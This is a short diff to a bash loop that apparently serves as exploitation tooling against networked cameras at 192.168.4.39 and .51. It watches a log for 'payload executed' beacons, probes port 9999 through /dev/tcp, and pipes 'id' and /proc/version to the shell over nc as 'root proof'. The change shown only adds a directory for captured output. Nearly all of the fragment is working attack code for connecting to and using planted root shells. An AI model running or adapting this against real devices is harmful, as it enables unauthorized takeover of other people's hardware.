@@ -12,6 +12,7 @@ while true; do
     echo "$(date '+%H:%M:%S') *** NEW BEACON — payload executed ***"
     grep BEACON /tmp/fss_beacons.log | tail -1
     for cam in 39 51; do
+      mkdir -p /tmp/pane1/192.168.4.$cam
       if timeout 4 bash -c "exec 3<>/dev/tcp/192.168.4.$cam/9999" 2>/dev/null; then
         echo "$(date '+%H:%M:%S') *** ROOT SHELL on .$cam:9999 — capturing id ***"
         (printf 'id > /tmp/root_proof.txt; cat /proc/version >> /tmp/root_proof.txt\n'; sleep 2) | timeout 8 nc 192.168.4.$cam 9999 > /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null
